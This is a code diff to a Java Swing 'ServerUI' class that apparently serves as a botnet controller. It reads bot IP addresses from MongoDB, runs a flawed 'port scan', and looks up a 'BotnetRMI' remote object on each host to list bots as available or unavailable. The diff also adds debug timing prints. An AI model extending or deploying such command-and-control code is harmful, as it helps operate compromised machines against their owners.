@@ -12,9 +12,21 @@ import java.awt.Font;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.lang.String;
+import java.net.DatagramSocket;
 import java.net.InetAddress;
+import java.net.InetSocketAddress;
+import java.net.MalformedURLException;
+import java.net.Socket;
+import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.rmi.Naming;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.RMIClientSocketFactory;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
 import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
@@ -106,22 +118,59 @@ public class ServerUI extends javax.swing.JFrame {
         pack();
     }// </editor-fold>//GEN-END:initComponents
 
+    public void getTime(){
+        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");  
+        LocalDateTime now = LocalDateTime.now();  
+        System.out.println(dtf.format(now));  
+    }
+    
     private void startBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_startBtnActionPerformed
         // TODO add your handling code here:
-        TCPServer tcpServer = new TCPServer(2345);
-        tcpServer.start();
+        
+        System.out.println("First");
+        getTime();
+//        TCPServer tcpServer = new TCPServer(2345);
+//        tcpServer.start();
+        System.out.println("Second");
+        getTime();
+        
         MongoConnect client = new MongoConnect();
         client.Connect();
+        
+        System.out.println("Third");
+        getTime();
+        
         ArrayList<String> list = client.Read("bot_ip");
         ArrayList<String> states = new ArrayList<>();
+        
+        
+        
+        
+        
         for (String ip : list){
+            
+            ip = ip.replace("/", "");
+            
             try {
-                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
+                //Scan port
+                InetAddress inet = InetAddress.getByName(ip);
+                DatagramSocket server = new DatagramSocket(1234,inet);
+                server.close();
+                
+                //Connect to RMI registry
+                IBotnet botnet = (IBotnet) Naming.lookup("rmi://" + ip + ":" + "1234" + "/BotnetRMI");
                 states.add("Available");
-            } catch (Exception ex){
+                
+            } catch (SocketException | UnknownHostException | MalformedURLException | RemoteException | NotBoundException ex) {
                 states.add("Unavailable");
+                System.out.println(ex.getMessage());
             }
         }
+        
+        System.out.println("Fourth");
+        getTime();
+        
+        
         new ListFrm(list, states).setVisible(true);
         this.setVisible(false);
     }//GEN-LAST:event_startBtnActionPerformed
